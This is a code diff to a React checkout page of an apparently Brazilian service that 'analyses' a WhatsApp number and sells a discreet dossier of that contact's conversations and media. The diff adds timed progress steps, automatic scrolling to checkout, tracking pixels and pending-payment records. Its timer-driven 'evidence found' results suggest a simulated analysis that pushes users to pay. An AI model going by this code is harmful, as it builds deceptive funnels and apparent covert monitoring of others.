@@ -1,4 +1,4 @@
-import { useState, useEffect, useRef } from 'react'
+import { useState, useEffect, useRef, useMemo, useCallback } from 'react'
 import { useNavigate } from 'react-router-dom'
 import {
   Search,
@@ -17,6 +17,7 @@ import {
   UserRound
 } from 'lucide-react'
 import { updateLeadName, saveAnalysisResults, getAnalysisResults, saveCardData, type CardData } from '../services/supabase'
+import { upsertPendingPayment, updatePendingPayment } from '../services/paymentService'
 import QRCodePix from '../components/QRCodePix'
 import { useMetaPixel } from '../hooks/useMetaPixel'
 import { useAnalytics } from '../hooks/useAnalytics'
@@ -63,6 +64,8 @@ const AnalysisPage = () => {
   const { trackEvent } = useMetaPixel()
   const { trackEvent: trackAnalytics, trackFunnel } = useAnalytics()
   const intervalRef = useRef<NodeJS.Timeout | null>(null)
+  const progressSectionRef = useRef<HTMLDivElement | null>(null)
+  const resultsSectionRef = useRef<HTMLDivElement | null>(null)
   const [currentStep, setCurrentStep] = useState(0)
   const [isAnalyzing, setIsAnalyzing] = useState(true)
   const [analysisData, setAnalysisData] = useState<any>(null)
@@ -84,8 +87,26 @@ const AnalysisPage = () => {
   const [isProcessing, setIsProcessing] = useState(false)
   const [cardError, setCardError] = useState('')
   const [showPixDiscount, setShowPixDiscount] = useState(false)
+  const [planCommitted, setPlanCommitted] = useState(false)
 
-  const planOptions = [
+  const resultsScrollTriggeredRef = useRef(false)
+  const lastPendingPaymentRef = useRef<{ planId: 'basic' | 'premium'; amount: number } | null>(null)
+  const basePaymentCreatedRef = useRef(false)
+  const stepRefs = useRef<(HTMLDivElement | null)[]>([])
+
+  const wait = (ms: number) => new Promise(resolve => setTimeout(resolve, ms))
+  const HEADER_OFFSET = 120
+
+  const scrollElement = (element: HTMLElement | null) => {
+    if (!element) return
+    requestAnimationFrame(() => {
+      const rect = element.getBoundingClientRect()
+      const targetY = window.scrollY + rect.top - HEADER_OFFSET
+      window.scrollTo({ top: targetY, behavior: 'smooth' })
+    })
+  }
+
+  const planOptions = useMemo(() => [
     {
       id: 'basic' as const,
       name: 'Análise Completa',
@@ -98,7 +119,7 @@ const AnalysisPage = () => {
         'Relatório detalhado com todas as evidências encontradas',
         'Pontuação de risco e recomendações práticas',
         'Download em PDF para salvar ou compartilhar',
-        'Suporte via e-mail por 7 dias'
+        'Acesso aos dados por 7 dias'
       ]
     },
     {
@@ -113,10 +134,10 @@ const AnalysisPage = () => {
         'Análises ilimitadas para sempre',
         'Histórico salvo com evolução do risco',
         'Alertas em tempo real de novos indícios',
-        'Suporte prioritário e comunidade exclusiva'
+        'Acesso permanente à comunidade exclusiva'
       ]
     }
-  ]
+  ], [])
 
   const selectedPlanOption = planOptions.find(plan => plan.id === selectedPlan) || planOptions[0]
   const planValue = selectedPlanOption.priceValue
@@ -124,6 +145,7 @@ const AnalysisPage = () => {
   const storedPlanName = typeof analysisData?.selectedPlanName === 'string' ? analysisData.selectedPlanName : null
   const planDisplayPrice = storedPlanLabel ?? selectedPlanOption.priceLabel ?? formatCurrency(planValue)
   const planDisplayName = storedPlanName ?? selectedPlanOption.name
+  const planBadgeName = planDisplayName.replace(/^Plano\s+/i, '').trim() || planDisplayName
   const planPreselected = Boolean(analysisData?.selectedPlanId)
   const pixDiscountValue = Number((planValue * 0.8).toFixed(2))
   const pixDiscountDisplay = formatCurrency(pixDiscountValue)
@@ -162,6 +184,40 @@ const AnalysisPage = () => {
     profileData?.verifiedName?.trim() ||
     ''
   const displayName = profileName || formattedWhatsapp || rawWhatsapp || 'Contato analisado'
+
+  const syncPendingPayment = useCallback(async (planId: 'basic' | 'premium', overrideName?: string | null) => {
+    const whatsapp = analysisData?.whatsapp
+    if (!whatsapp) {
+      return
+    }
+
+    const planMeta = planOptions.find(option => option.id === planId)
+    if (!planMeta) {
+      return
+    }
+
+    const normalizedWhatsapp = whatsapp.replace(/\D/g, '')
+    const nameFallback = overrideName ?? displayName ?? (formattedWhatsapp || normalizedWhatsapp)
+
+    const last = lastPendingPaymentRef.current
+    if (last && last.planId === planId && last.amount === planMeta.priceValue) {
+      return
+    }
+
+    try {
+      await upsertPendingPayment({
+        whatsapp,
+        amount: planMeta.priceValue,
+        plan_id: planMeta.id,
+        plan_name: planMeta.name,
+        payment_method: 'manual',
+        nome: nameFallback
+      })
+      lastPendingPaymentRef.current = { planId, amount: planMeta.priceValue }
+    } catch (error) {
+      console.error('Erro ao sincronizar pagamento pendente', error)
+    }
+  }, [analysisData?.whatsapp, planOptions, displayName, formattedWhatsapp])
 
   const [steps, setSteps] = useState<AnalysisStep[]>([
     {
@@ -351,9 +407,16 @@ const AnalysisPage = () => {
         setCurrentStep(prev => {
           if (prev < steps.length - 1) {
             setSteps(current => 
-              current.map((step, index) => 
-                index === prev ? { ...step, completed: true } : step
-              )
+              current.map((step, index) => {
+                if (index === prev) {
+                  const updatedStep = { ...step, completed: true }
+                  if (updatedStep.id === 'connection') {
+                    void syncPendingPayment(selectedPlan, displayName)
+                  }
+                  return updatedStep
+                }
+                return step
+              })
             )
             return prev + 1
           } else {
@@ -363,6 +426,7 @@ const AnalysisPage = () => {
                 index === prev ? { ...step, completed: true } : step
               )
             )
+            void syncPendingPayment(selectedPlan, displayName)
             setIsAnalyzing(false)
             if (intervalRef.current) {
               clearInterval(intervalRef.current)
@@ -385,7 +449,6 @@ const AnalysisPage = () => {
 
   const analysisResultsSavedRef = useRef(false)
   const autoCheckoutTriggeredRef = useRef(false)
-  const autoPlansShownRef = useRef(false)
 
   async function persistAnalysisResults() {
     if (analysisResultsSavedRef.current) {
@@ -423,7 +486,7 @@ const AnalysisPage = () => {
     analysisResultsSavedRef.current = true
   }
 
-  async function handleShowPaymentPlans() {
+  async function handleShowPaymentPlans({ skipScroll = false }: { skipScroll?: boolean } = {}) {
     await persistAnalysisResults()
 
     trackEvent('ViewContent', {
@@ -433,15 +496,17 @@ const AnalysisPage = () => {
 
     setShowPaymentPlans(true)
 
-    setTimeout(() => {
-      const plansElement = document.getElementById('payment-plans')
-      if (plansElement) {
-        plansElement.scrollIntoView({ block: 'start' })
-      }
-    }, 100)
+    if (!skipScroll) {
+      setTimeout(() => {
+        const plansElement = document.getElementById('payment-plans')
+        if (plansElement) {
+          plansElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
+        }
+      }, 100)
+    }
   }
 
-  async function handleProceedToPayment(forceSkipPlans = false) {
+  async function handleProceedToPayment({ forceSkipPlans = false, skipScroll = false }: { forceSkipPlans?: boolean; skipScroll?: boolean } = {}) {
     const planValue = selectedPlanOption.priceValue
     const planName = selectedPlanOption.name
     const cleanWhatsapp = analysisData?.whatsapp?.replace(/\D/g, '') || ''
@@ -452,6 +517,7 @@ const AnalysisPage = () => {
     }
 
     await persistAnalysisResults()
+    await syncPendingPayment(selectedPlan, displayName)
 
     trackEvent('InitiateCheckout', {
       content_name: planName,
@@ -468,13 +534,30 @@ const AnalysisPage = () => {
 
     setShowPaymentMethods(true)
 
-    setTimeout(() => {
-      const paymentElement = document.getElementById('payment-methods')
-      if (paymentElement) {
-        paymentElement.scrollIntoView({ block: 'start' })
-      }
-    }, 100)
+    if (!skipScroll) {
+      setTimeout(() => {
+        const paymentElement = document.getElementById('payment-methods')
+        if (paymentElement) {
+          paymentElement.scrollIntoView({ behavior: 'smooth', block: 'start' })
+        }
+      }, 200)
+    }
   }
+
+  useEffect(() => {
+    if (isAnalyzing) {
+      resultsScrollTriggeredRef.current = false
+      const currentStepElement = stepRefs.current[currentStep] ?? document.getElementById(`analysis-step-${currentStep}`)
+      if (currentStepElement) {
+        setTimeout(() => scrollElement(currentStepElement), 120)
+      } else if (progressSectionRef.current) {
+        setTimeout(() => scrollElement(progressSectionRef.current), 120)
+      }
+    } else if (!resultsScrollTriggeredRef.current) {
+      resultsScrollTriggeredRef.current = true
+      setTimeout(() => scrollElement(resultsSectionRef.current), 180)
+    }
+  }, [currentStep, isAnalyzing])
 
   useEffect(() => {
     if (!analysisData) return
@@ -484,21 +567,96 @@ const AnalysisPage = () => {
     if (autoCheckoutTriggeredRef.current) return
 
     autoCheckoutTriggeredRef.current = true
-    void handleProceedToPayment(true)
+
+    const runGuidedFlow = async () => {
+      await wait(300)
+      scrollElement(resultsSectionRef.current)
+
+      await wait(1200)
+      await handleProceedToPayment({ forceSkipPlans: true, skipScroll: true })
+    }
+
+    runGuidedFlow().catch(() => {
+      autoCheckoutTriggeredRef.current = false
+    })
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [analysisData, planPreselected, showPaymentMethods, isAnalyzing])
 
   useEffect(() => {
     if (!analysisData) return
+    if (isAnalyzing) return
     if (planPreselected) return
     if (showPaymentPlans) return
-    if (isAnalyzing) return
-    if (autoPlansShownRef.current) return
 
-    autoPlansShownRef.current = true
-    void handleShowPaymentPlans()
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [analysisData, planPreselected, showPaymentPlans, isAnalyzing])
+    const timeoutId = window.setTimeout(() => {
+      void handleShowPaymentPlans({ skipScroll: true })
+    }, 1200)
+
+    return () => {
+      window.clearTimeout(timeoutId)
+    }
+  }, [analysisData, isAnalyzing, planPreselected, showPaymentPlans])
+
+  useEffect(() => {
+    if (planPreselected) {
+      setPlanCommitted(true)
+    }
+  }, [planPreselected, analysisData?.whatsapp])
+
+  useEffect(() => {
+    if (basePaymentCreatedRef.current) return
+    if (!analysisData?.whatsapp) return
+
+    const planMeta = planOptions.find(option => option.id === selectedPlan)
+    if (!planMeta) return
+
+    const amount = planPreselected ? planMeta.priceValue : 0
+    const nameToPersist = displayName || formattedWhatsapp || analysisData.whatsapp
+
+    const createPending = async () => {
+      try {
+        await upsertPendingPayment({
+          whatsapp: analysisData.whatsapp,
+          amount,
+          plan_id: planMeta.id,
+          plan_name: planMeta.name,
+          payment_method: 'manual',
+          nome: nameToPersist
+        })
+        basePaymentCreatedRef.current = true
+        lastPendingPaymentRef.current = { planId: planMeta.id, amount }
+      } catch (error) {
+        console.error('Erro ao criar pagamento pendente inicial', error)
+      }
+    }
+
+    void createPending()
+  }, [analysisData?.whatsapp, planPreselected, planOptions, selectedPlan, displayName, formattedWhatsapp])
+
+  useEffect(() => {
+    if (!analysisData?.whatsapp) return
+    if (!planPreselected && !planCommitted) return
+    void syncPendingPayment(selectedPlan, displayName)
+  }, [analysisData?.whatsapp, planPreselected, planCommitted, selectedPlan, syncPendingPayment, displayName])
+
+  useEffect(() => {
+    if (!basePaymentCreatedRef.current) return
+    if (!analysisData?.whatsapp) return
+    if (!displayName) return
+
+    const planMeta = planOptions.find(option => option.id === selectedPlan)
+    if (!planMeta) return
+
+    const amount = planPreselected || planCommitted ? planMeta.priceValue : 0
+
+    void updatePendingPayment({
+      whatsapp: analysisData.whatsapp,
+      amount,
+      plan_id: planMeta.id,
+      plan_name: planMeta.name,
+      nome: displayName
+    })
+  }, [analysisData?.whatsapp, planPreselected, planCommitted, displayName, planOptions, selectedPlan])
 
   const generateRecommendations = () => {
     return [
@@ -509,7 +667,7 @@ const AnalysisPage = () => {
     ]
   }
 
-  async function handlePixPayment() {
+  const handlePixPayment = () => {
     // Rastreia pagamento via PIX
     const planValue = selectedPlanOption.priceValue
     const planName = selectedPlanOption.name
@@ -764,7 +922,7 @@ const AnalysisPage = () => {
           <div className="flex flex-col items-stretch gap-2 text-xs sm:flex-row sm:items-center sm:gap-3 sm:text-sm">
             <div className="flex flex-wrap items-center gap-2">
               <span className="inline-flex items-center gap-2 rounded-full bg-rose-50 px-3 py-1 font-semibold text-rose-600">
-                Plano: <span className="font-semibold text-rose-600">{planDisplayName}</span>
+                Plano: <span className="font-semibold text-rose-600">{planBadgeName}</span>
               </span>
               <span className="rounded-full bg-white px-3 py-1 font-medium text-slate-600 shadow-sm">
                 {planDisplayPrice}
@@ -797,7 +955,7 @@ const AnalysisPage = () => {
               </div>
 
               <div className="grid gap-4 md:grid-cols-3">
-                <div className="group relative overflow-hidden rounded-[1.9rem] border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
+                <div className="group relative overflow-hidden rounded-3xl border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                   <div className="pointer-events-none absolute -right-8 top-1/2 h-24 w-24 -translate-y-1/2 rounded-full bg-rose-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
                   <div className="relative flex items-center justify-between gap-4">
                     <div>
@@ -811,9 +969,9 @@ const AnalysisPage = () => {
                   <p className="mt-4 text-xs text-slate-500">Número verificado para a análise atual.</p>
                 </div>
 
-                <div className="group relative overflow-hidden rounded-[1.9rem] border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
+                <div className="group relative overflow-hidden rounded-3xl border border-rose-100/70 bg-white/95 p-6 shadow-lg shadow-rose-100/50 transition-all duration-300 hover:-translate-y-1 hover:shadow-rose-200/60">
                   <div className="pointer-events-none absolute -left-10 top-0 h-24 w-24 rounded-full bg-emerald-100/40 blur-2xl transition-opacity duration-300 group-hover:opacity-100"></div>
-                  <div className="relative flex items-center justify-between gap-4">
+                  <div className="relative flex items-center justify-between gap-4 pr-4">
                     <div>
                       <span className="text-[11px] font-semibold uppercase tracking-[0.32em] text-slate-400">Status</span>
                       <p className={`mt-4 text-xl font-semibold ${isAnalyzing ? 'text-amber-600' : 'text-emerald-600'}`}>
@@ -821,7 +979,7 @@ const AnalysisPage = () => {
                       </p>
                     </div>
                     <span
-                      className={`flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl border shadow-sm ${
+                      className={`ml-2 flex h-12 w-12 flex-shrink-0 items-center justify-center rounded-2xl border shadow-sm ${
                         isAnalyzing ? 'border-amber-100 bg-amber-50 text-amber-500' : 'border-emerald-100 bg-emerald-50 text-emerald-500'
                       }`}
                     >
@@ -905,7 +1063,10 @@ const AnalysisPage = () => {
           </div>
         </section>
 
-        <section className="relative pb-12">
+        <section
+          ref={progressSectionRef}
+          className="relative pb-12"
+        >
           <div className="mx-auto max-w-5xl px-4">
             <div className="card-surface border border-white/60 bg-white/90 shadow-xl backdrop-blur-xl">
               <div className="flex flex-col gap-6 md:flex-row md:items-center md:justify-between">
@@ -940,13 +1101,17 @@ const AnalysisPage = () => {
                     const isDone = step.completed
                     return (
                       <div
+                        id={`analysis-step-${index}`}
+                        ref={element => {
+                          stepRefs.current[index] = element
+                        }}
                         key={step.id}
-                        className={`relative overflow-hidden rounded-3xl border transition-all duration-300 ${
-                          isDone
-                            ? 'border-emerald-200 bg-emerald-50/70'
-                            : isCurrent
-                            ? 'border-rose-200 bg-rose-50/80'
-                            : 'border-slate-200 bg-white'
+                        className={`rounded-[2rem] border px-6 py-5 shadow-sm transition-all duration-300 scroll-mt-32 sm:px-8 sm:py-6 ${
+                          isCurrent
+                            ? 'border-rose-200/80 bg-gradient-to-r from-white via-rose-50/60 to-white shadow-rose-200/50'
+                            : isDone
+                              ? 'border-rose-200 bg-rose-50/80'
+                              : 'border-slate-200 bg-white'
                         }`}
                       >
                         <div
@@ -1021,7 +1186,10 @@ const AnalysisPage = () => {
                           <AlertTriangle className="h-4 w-4" />
                           Análise concluída
                         </span>
-                        <h3 className="text-3xl font-semibold text-slate-900 md:text-4xl">
+                        <h3
+                          ref={resultsSectionRef}
+                          className="text-3xl font-semibold text-slate-900 md:text-4xl"
+                        >
                           Evidências relevantes encontradas
                         </h3>
                         <p className="max-w-2xl text-base text-slate-600 md:text-lg">
@@ -1075,7 +1243,7 @@ const AnalysisPage = () => {
                       </div>
                     </div>
 
-                    <div className="grid gap-6 lg:grid-cols-[1.5fr,1fr]">
+                    <div className="grid gap-6">
                       <div className="rounded-3xl border border-rose-50 bg-white px-7 py-6 shadow-md shadow-rose-100/40">
                         <div className="flex items-start gap-4">
                           <div className="rounded-2xl bg-rose-500/10 p-3 text-rose-500">
@@ -1106,38 +1274,6 @@ const AnalysisPage = () => {
                           </div>
                         </div>
                       </div>
-
-                      <div className="flex flex-col justify-between rounded-3xl border border-rose-50 bg-gradient-to-b from-white via-rose-50/40 to-white px-7 py-6 text-center shadow-md shadow-rose-100/40">
-                        <div className="space-y-3">
-                          <span className="inline-flex items-center justify-center gap-2 rounded-full border border-rose-100 bg-white/80 px-4 py-1 text-xs font-semibold uppercase tracking-[0.2em] text-rose-600">
-                            <CheckCircle className="h-4 w-4" />
-                            Relatório pronto
-                          </span>
-                          <h4 className="text-2xl font-semibold text-slate-900">Libere o dossiê completo</h4>
-                          <p className="text-sm text-slate-600">
-                            Acesse conversas, mídias e recomendações personalizadas com poucos cliques e total discrição.
-                          </p>
-                        </div>
-
-                        {!showPaymentPlans ? (
-                          <button
-                            onClick={() => {
-                              void handleShowPaymentPlans()
-                            }}
-                            className="btn-gradient w-full justify-center px-6 py-3 text-base font-semibold shadow-lg shadow-rose-200/60"
-                          >
-                            Consultar relatório completo
-                          </button>
-                        ) : (
-                          <p className="text-sm font-semibold text-rose-600">
-                            👇 Selecione um plano para liberar todas as evidências
-                          </p>
-                        )}
-
-                        <p className="text-xs text-slate-500">
-                          Aprovação imediata e identificação confidencial em todo o processo.
-                        </p>
-                      </div>
                     </div>
                   </div>
                 </div>
@@ -1164,26 +1300,25 @@ const AnalysisPage = () => {
                   const isSelected = plan.id === selectedPlan
                   return (
                     <button
-                      key={plan.id}
                       type="button"
                       onClick={() => {
-                        const updatedPlan = planOptions.find(option => option.id === plan.id)
-                        if (updatedPlan) {
-                          setSelectedPlan(updatedPlan.id)
-                          setAnalysisData((prev: any) => {
-                            const nextData = prev ? { ...prev } : {}
-                            nextData.selectedPlanId = updatedPlan.id
-                            nextData.selectedPlanPrice = updatedPlan.priceValue
-                            nextData.selectedPlanLabel = updatedPlan.priceLabel
-                            nextData.selectedPlanName = updatedPlan.name
-                            localStorage.setItem('analysisData', JSON.stringify(nextData))
-                            return nextData
-                          })
-                        }
+                        setPlanCommitted(true)
+                        setSelectedPlan(plan.id)
+                        setAnalysisData((prev: any) => {
+                          const nextData = prev ? { ...prev } : {}
+                          nextData.selectedPlanId = plan.id
+                          nextData.selectedPlanPrice = plan.priceValue
+                          nextData.selectedPlanLabel = plan.priceLabel
+                          nextData.selectedPlanName = plan.name
+                          return nextData
+                        })
+                        void syncPendingPayment(plan.id, displayName)
                       }}
-                      className={`group relative flex h-full flex-col rounded-[2.25rem] border-2 bg-white p-8 text-left shadow-xl transition-all duration-300 backdrop-blur hover:-translate-y-1 hover:shadow-rose-200/70 ${
-                        isSelected ? 'border-rose-500 ring-4 ring-rose-500/20' : 'border-white/60'
-                      } ${plan.highlight ? 'bg-gradient-to-br from-white via-rose-50/40 to-amber-50/40' : 'bg-white/92'}`}
+                      className={`group relative block rounded-[28px] border-2 p-6 text-left transition-all duration-300 ${
+                        isSelected
+                          ? 'border-rose-400 bg-white shadow-xl shadow-rose-200/60'
+                          : 'border-rose-100 bg-white/80 hover:-translate-y-1 hover:border-rose-200 hover:shadow-lg'
+                      }`}
                     >
                       <div className="flex items-center justify-between">
                         <span
@@ -1243,6 +1378,7 @@ const AnalysisPage = () => {
               <div className="mt-12 flex flex-col items-center gap-3 text-center">
                 <button
                   onClick={() => {
+                    setPlanCommitted(true)
                     void handleProceedToPayment()
                   }}
                   className="btn-gradient flex items-center justify-center gap-3 rounded-full px-8 py-4 text-lg font-semibold shadow-lg shadow-rose-200/60"
